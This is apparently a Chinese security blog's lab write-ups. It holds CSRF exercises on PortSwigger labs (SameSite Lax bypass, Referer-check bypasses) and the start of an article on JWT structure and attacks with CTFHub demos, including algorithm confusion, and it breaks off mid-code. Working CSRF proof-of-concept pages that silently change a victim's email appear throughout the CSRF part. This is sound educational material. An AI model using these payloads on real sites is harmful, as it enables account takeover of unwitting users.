cms-xxx 在哪愣是没找到<br><img src="/../../../../../pic/Pasted%20image%2020230306222026.png"></p><p><img src="/../../../../../pic/Pasted%20image%2020230306223506.png"></p><p>获取到用户名与密码</p><p><img src="/../../../../../pic/Pasted%20image%2020230306223547.png"></p><p>登录后结束</p><h3 id="10-Lab-SameSite-Lax-bypass-via-cookie-refresh"><a href="#10-Lab-SameSite-Lax-bypass-via-cookie-refresh" class="headerlink" title="10. Lab: SameSite Lax bypass via cookie refresh"></a>10. Lab: SameSite Lax bypass via cookie refresh</h3><ul><li>题目描述</li></ul><p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p><p>The lab supports OAuth-based login. You can log in via your social media account with the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>使用 wiener / peter 登录经过了 OAuth 的认证，在设置 Cookie 时并没有设置 SameSite 限制，因此为默认 Laz</p><p><img src="/../../../../../pic/Pasted%20image%2020230306231132.png"></p><p>生成个 POC</p><p>在较短的时间内不需要再次经过 OAuth 认证即可攻击成功</p><p>在有一段时间之后则需要先请求 OAuth 先进行认证，然后再一段时间之后再进行攻击</p><p>POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"admin668&amp;#64;admin&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>      window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/social-login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在点击时就会先去认证，然后一段时间之后再进行攻击修改邮箱</p><p>访问 POC</p><p><img src="/../../../../../pic/Pasted%20image%2020230306231538.png"></p><p>在 Chrome 中自动组织了弹出窗口，因此需要引诱用户自己点击从而执行脚本</p><p>构造新 POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"test&amp;#64;test&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Click Me<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>      window<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://0a020009030145bcc28693de00190075.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在用户点击之后会执行认证，在差不多认证完之后再修改邮箱</p><p><img src="/../../../../../pic/Pasted%20image%2020230306232150.png"></p><h3 id="11-Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><a href="#11-Lab-CSRF-where-Referer-validation-depends-on-header-being-present" class="headerlink" title="11. Lab: CSRF where Referer validation depends on header being present"></a>11. Lab: CSRF where Referer validation depends on header being present</h3><p>#Referer </p><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>在登录中设置 SameSite 为  None，即不受域的限制</p><p><img src="/../../../../../pic/Pasted%20image%2020230306232611.png"></p><p>在修改 Referer 之后，发包</p><p><img src="/../../../../../pic/Pasted%20image%2020230306232830.png"></p><p>检测到来源不符，不予通过</p><p>可以在 POC 中添加</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>referrer<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no-referrer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用于禁止 referer</p><p>构造 POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"referrer"</span> content<span class="token operator">=</span><span class="token string">"no-referrer"</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a680083037ef0c1c24d1bca00d0000c.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"test&amp;#64;test&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit request"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306233031.png"></p><h3 id="12-Lab-CSRF-with-broken-Referer-validation"><a href="#12-Lab-CSRF-with-broken-Referer-validation" class="headerlink" title="12. Lab: CSRF with broken Referer validation"></a>12. Lab: CSRF with broken Referer validation</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>可以将原始域以查询字符串的形式将其追加到 Referer 标头</p><pre class="line-numbers language-none"><code class="language-none">Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造 POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a6100e90307b976c1d6a9df00d9001f.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"admin1&amp;#64;admin&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/?0a6100e90307b976c1d6a9df00d9001f.web-security-academy.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这将导致生成的请求中的 Referer 标头在查询字符串中包含目标站点的 URL，就像我们之前测试的那样。</p><p>许多浏览器现在默认从 Referer 标头中删除查询字符串。要覆盖此行为并确保请求中包含完整的 URL，请返回到漏洞利用服务器并将以下标头添加到“Head”部分：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Referrer-Policy: unsafe-url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306234342.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_45728976/article/details/104506544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167828679716800182152124%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167828679716800182152124&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-104506544-null-null.blog_rank_default&amp;utm_term=CSRF&amp;spm=1018.2226.3001.4450">漏洞复现篇——CSRF漏洞的利用_csrf漏洞利用_admin-r꯭o꯭ot꯭的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/343515825">什么是CSRF？如何防御CSRF攻击？知了堂告诉你 - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT 原理&amp;攻击</title>
      <link href="/2023/01/28/skilllearning/jwt/jwt-yuan-li-gong-ji/"/>
      <url>/2023/01/28/skilllearning/jwt/jwt-yuan-li-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT-原理-amp-攻击"><a href="#JWT-原理-amp-攻击" class="headerlink" title="JWT 原理&amp;攻击"></a>JWT 原理&amp;攻击</h1><h2 id="1-JWT"><a href="#1-JWT" class="headerlink" title="1. JWT"></a>1. JWT</h2><p>JWT，即 JSON WEB TOKEN，它是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，是一种标准化的格式，用于在系统之间发送经过加密签名的JSON数据，·理论上可以包含任何类型的数据，但最常用于发送关于用户的信息（“声明”），以进行身份认证、会话处理和访问控制。</p><p>JWT作用：</p><ul><li>授权：一旦用户登录，每个后续请求将包括JWT，从而允许用户访问该令牌允许的路由，服务和资源。它的开销很小并且可以在不同的域中使用。如：单点登录。</li><li>信息交换：在各方之间安全地传输信息。JWT可进行签名（如使用公钥/私钥对)，因此可确保发件人。由于签名是使用标头和有效负载计算的，因此还可验证内容是否被篡改。</li></ul><h2 id="2-JWT-结构"><a href="#2-JWT-结构" class="headerlink" title="2. JWT 结构"></a>2. JWT 结构</h2><p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>因此，一个典型的JWT看起来是这个样子的：</p><pre><code>xxxxx.yyyyy.zzzzz</code></pre><p>接下来具体看每一部分</p><h3 id="2-1-Header"><a href="#2-1-Header" class="headerlink" title="2.1 Header"></a>2.1 Header</h3><p>Header 典型的由两部分组成：令牌的类型和签名算法，常见的算法有很多种，例如&nbsp;HMAC SHA256 或&nbsp;RSA。但它也还有一个 kid 参数，这是一个可选参数，全称是key ID，它用于指定加密算法的密钥。</p><p>例如</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>    <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后，用 Base64 对这个 JSON 编码就得到 JWT 的第一部分</p><pre class="line-numbers language-none"><code class="language-none">ewogICAgImFsZyI6ICJIUzI1NiIsCiAgICAidHlwIjogIkpXVCIKfQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>alg 指的就是算法，这里的算法就是 HS256，typ 指的是令牌类型。这里需要说明一点，就是明文在加密时其实采用的是Base64URL 加密，这种加密方式并非 Base64encode+URLencode，而是对一些特殊字符进行了替换，具体说明如下</p><pre class="line-numbers language-none"><code class="language-none">JWT 作为一个令牌(token)，有些场合可能会放到 URL(比如 api.example.com/?token=xxx)。Base64有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-Payload"><a href="#2-2-Payload" class="headerlink" title="2.2 Payload"></a>2.2 Payload</h3><p>有效载荷就是存放有效信息的地方，其中包含声明。声明包含三个部分 </p><p>1、已注册声明&nbsp;</p><p>这个部分的话就是已经预先定义过的声明，常见的声明主要有以下几种</p><pre class="line-numbers language-none"><code class="language-none">iss:&nbsp;jwt签发者sub:&nbsp;jwt所面向的用户aud:&nbsp;接收jwt的一方exp:&nbsp;jwt的过期时间，这个过期时间必须要大于签发时间nbf:&nbsp;定义在什么时间之前，该jwt都是不可用的.iat:&nbsp;jwt的签发时间jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、公共的声明&nbsp;</p><p>这些可以由使用 JWT 的人随意定义，一般用于添加用户的相关信息或其他业务需要的必要信息。但不建议添加敏感信息，因为该部分在客户端可进行解码. 3、私有的声明&nbsp;这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。</p><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">{&nbsp;&nbsp;&nbsp;&nbsp;"sub":&nbsp;"admin",&nbsp;&nbsp;&nbsp;&nbsp;//jwt所面向的用户&nbsp;&nbsp;&nbsp;&nbsp;"user_role":&nbsp;"admin",&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//当前登录用户&nbsp;&nbsp;&nbsp;&nbsp;"iss":&nbsp;"admin",&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//该JWT的签发者,有些是URL&nbsp;&nbsp;&nbsp;&nbsp;"iat":&nbsp;1573440582,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//签发时间&nbsp;&nbsp;&nbsp;&nbsp;"exp":&nbsp;1573940267,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//过期时间&nbsp;&nbsp;&nbsp;&nbsp;"nbf":&nbsp;1573440582,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//该时间之前不接收处理该Token&nbsp;&nbsp;&nbsp;&nbsp;"jti":&nbsp;"dff4214121e83057655e10bd9751d657"&nbsp;&nbsp;&nbsp;//Token唯一标识}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64 编码之后为</p><pre class="line-numbers language-none"><code class="language-none">ewogICAgInN1YiI6ICJhZG1pbiIsCiAgICAidXNlcl9yb2xlIjogImFkbWluIiwKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE1NzM0NDA1ODIsCiAgICAiZXhwIjogMTU3Mzk0MDI2NywKICAgICJuYmYiOiAxNTczNDQwNTgyLAogICAgImp0aSI6ICJkZmY0MjE0MTIxZTgzMDU3NjU1ZTEwYmQ5NzUxZDY1NyIKfQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就获得了 JWT 的第二部分</p><h3 id="2-3-Signature"><a href="#2-3-Signature" class="headerlink" title="2.3 Signature"></a>2.3 Signature</h3><p>由于头部和有效载荷以明文形式存储，因此，需要使用签名来防止数据被篡改。所以这部分是一个签证信息，这个签证信息由三部分组成</p><pre class="line-numbers language-none"><code class="language-none">1、Header&nbsp;(base64URL编码)2、Payload&nbsp;(base64URL编码)3、Secret（密钥）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>它的计算方式如下</p><pre class="line-numbers language-none"><code class="language-none">Signature=HMACSHA256(base64UrlEncode(header)&nbsp;+&nbsp;"."&nbsp;+base64UrlEncode(payload),secret)//假设这里是HS256算法，如果是其他算法的话开头设置为其他算法即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-JWT-攻击"><a href="#3-JWT-攻击" class="headerlink" title="3. JWT 攻击"></a>3. JWT 攻击</h2><h3 id="3-1-敏感信息泄露"><a href="#3-1-敏感信息泄露" class="headerlink" title="3.1 敏感信息泄露"></a>3.1 敏感信息泄露</h3><p>JWT 保证的是数据传输过程中的完整性而不是机密性。</p><p>因为 JWT 的 Payload 部分是使用 Base64Url 编码的，所以它其实是相当于明文传输的，当 Payload 中携带了敏感信息时，我们对 Payload 部分进行 Base64Url 解码，就可以读取到 Payload 中携带的敏感信息。</p><p><strong>靶场演示</strong></p><p>题目链接 <a href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a> 题目描述如下</p><pre class="line-numbers language-none"><code class="language-none">JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给了一个登录框</p><p><img src="/../../../../pic/Pasted%20image%2020221215171051.png"></p><p>使用任意账户登录后返回 Cookie</p><p><img src="/../../../../pic/Pasted%20image%2020221215171407.png"></p><p>使用插件解开</p><p><img src="/../../../../pic/Pasted%20image%2020221215171553.png"></p><p>将 FL 与 AG 拼接获得 FLAG</p><pre class="line-numbers language-none"><code class="language-none">ctfhub{b22166bac39f524ded7bb606}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-算法修改攻击"><a href="#3-2-算法修改攻击" class="headerlink" title="3.2 算法修改攻击"></a>3.2 算法修改攻击</h3><p>首先来简述一下JWT中两个常用的加密算法</p><pre class="line-numbers language-none"><code class="language-none">HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证 RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从上面不难看出，HS256 自始至终只有一个密钥，而 RS256 是有两个密钥的。在通常情况下，HS256 的密钥我们是不能取到的，RS256 的密钥也是很难获得的，RS256 的的公钥相对较容易获取，但无论是 HS256 加密还是 RS256 加密，都是无法实现伪造 JWT 的，但当我们修改 RSA256 算法为 HS256 算法时，后端代码会使用公钥作为密钥，然后用 HS256 算法验证签名，如果我们此时有公钥，那么此时我们就可与实现 JWT 的伪造。</p><p><strong>靶场演示</strong></p><p>题目链接 <a href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none">有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入环境直接给出了源代码，使用 PHP 实现的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>Firebase<span class="token punctuation">\</span>JWT<span class="token punctuation">\</span>JWT</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">JWTHelper</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token operator">=</span><span class="token string single-quoted-string">'HS256'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token operator">=</span><span class="token string single-quoted-string">'HS256'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$algs</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token operator">-&gt;</span><span class="token property">alg</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$algs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getHeader</span><span class="token punctuation">(</span><span class="token variable">$jwt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$tks</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$jwt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$headb64</span><span class="token punctuation">,</span> <span class="token variable">$bodyb64</span><span class="token punctuation">,</span> <span class="token variable">$cryptob64</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$tks</span><span class="token punctuation">;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">jsonDecode</span><span class="token punctuation">(</span><span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">urlsafeB64Decode</span><span class="token punctuation">(</span><span class="token variable">$headb64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$header</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$FLAG</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$PRIVATE_KEY</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string 